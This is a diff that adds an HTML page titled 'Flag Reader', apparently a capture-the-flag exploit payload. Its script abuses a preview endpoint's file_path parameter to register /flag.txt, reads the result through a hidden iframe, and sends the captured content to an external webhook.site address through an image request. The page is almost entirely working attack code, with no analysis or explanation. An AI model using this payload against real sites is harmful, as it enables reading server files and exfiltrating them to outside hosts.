@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flag Reader</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #000;
+            color: #0f0;
+            padding: 40px;
+        }
+        pre {
+            background: #111;
+            padding: 20px;
+            border: 2px solid #0f0;
+        }
+    </style>
+</head>
+<body>
+    <h1>🚩 FLAG EXTRACTION 🚩</h1>
+    <div id="status">Carregando...</div>
+    <div id="flag"></div>
+    
+    <script>
+        const currentPath = window.location.pathname;
+        const ourPreviewId = currentPath.split('/').pop();
+        
+        console.log('Preview ID:', ourPreviewId);
+        
+        // Step 1: Register /flag.txt
+        const registrationUrl = window.location.href.split('?')[0] + '?preview_id=' + ourPreviewId + '&file_path=/flag.txt';
+        
+        const img = new Image();
+        img.src = registrationUrl;
+        
+        // Step 2: Use iframe to load the flag
+        setTimeout(() => {
+            console.log('Creating iframe...');
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = window.location.href.split('?')[0];
+            
+            iframe.onload = function() {
+                try {
+                    const flagContent = iframe.contentDocument.documentElement.innerHTML;
+                    console.log('Flag from iframe:', flagContent);
+                    
+                    document.getElementById('status').innerHTML = '✅ Flag Lida!';
+                    document.getElementById('flag').innerHTML = '<pre style="color: #0f0;">' + flagContent.substring(0, 1000) + '</pre>';
+                    
+                    // Send to webhook
+                    const webhookUrl = 'https://webhook.site/8325596f-4a1b-4107-ac71-9d223187d9d1';
+                    const encodedFlag = encodeURIComponent(flagContent);
+                    
+                    const webhookImg = new Image();
+                    webhookImg.src = webhookUrl + '?flag=' + encodedFlag;
+                } catch (e) {
+                    console.error('Iframe error:', e);
+                    document.getElementById('status').innerHTML = '❌ Erro ao ler iframe';
+                }
+            };
+            
+            iframe.onerror = function() {
+                console.error('Iframe load error');
+                document.getElementById('status').innerHTML = '❌ Erro ao carregar iframe';
+            };
+            
+            document.body.appendChild(iframe);
+        }, 500);
+    </script>
+</body>
+</html>
